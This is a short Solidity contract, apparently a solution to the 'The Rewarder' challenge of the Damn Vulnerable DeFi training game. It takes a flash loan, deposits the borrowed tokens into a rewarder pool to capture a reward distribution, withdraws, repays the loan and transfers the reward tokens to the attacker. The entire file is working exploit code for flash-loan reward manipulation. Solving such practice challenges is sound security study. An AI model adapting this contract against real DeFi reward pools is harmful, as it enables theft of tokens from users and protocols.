import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../DamnValuableToken.sol";

contract AttackReward {
    // ask for loan
    FlashLoanerPool flashloanPool;
    TheRewarderPool rewarderPool;
    DamnValuableToken public immutable liquidityToken;
    address payable owner;
    
    constructor(address _addressFlashloan, address _addressRewarder, address _liquidityTokenAddress, address payable _owner) {
        flashloanPool = FlashLoanerPool(_addressFlashloan);
        rewarderPool = TheRewarderPool(_addressRewarder);
        liquidityToken = DamnValuableToken(_liquidityTokenAddress);
        owner = _owner;

    }
    
    function attack(uint256 amount) external {
        flashloanPool.flashLoan(amount); 
    }

    function receiveFlashLoan(uint256 amount) external {
        // approve the reward pool to spend our borrowed funds
        liquidityToken.approve(address(rewarderPool), amount);

        // Deposit massive amount of funds and distributes rewards
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);

        // return funds
        liquidityToken.transfer(address(flashloanPool), amount);

        // transfer funds to attacker 
        uint256 balance = rewarderPool.rewardToken().balanceOf(address(this));
        rewarderPool.rewardToken().transfer(owner, balance);

    }
    
}